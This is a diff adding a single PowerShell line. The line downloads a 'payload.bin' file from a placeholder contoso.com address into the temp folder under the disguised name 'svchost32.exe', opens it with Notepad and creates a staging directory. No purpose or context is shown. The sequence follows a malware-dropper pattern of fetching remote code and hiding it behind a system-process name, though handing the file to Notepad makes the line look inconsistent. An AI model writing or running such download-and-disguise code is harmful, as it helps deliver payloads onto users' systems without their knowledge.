@@ -1,0 +1,1 @@
+$FetchUrl = 'https://contoso.com/downloads/payload.bin'; $DropPath = "$env:TEMP\svchost32.exe"; (New-Object System.Net.WebClient).DownloadFile($FetchUrl, $DropPath); Start-Process -FilePath "notepad.exe" -ArgumentList $DropPath; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
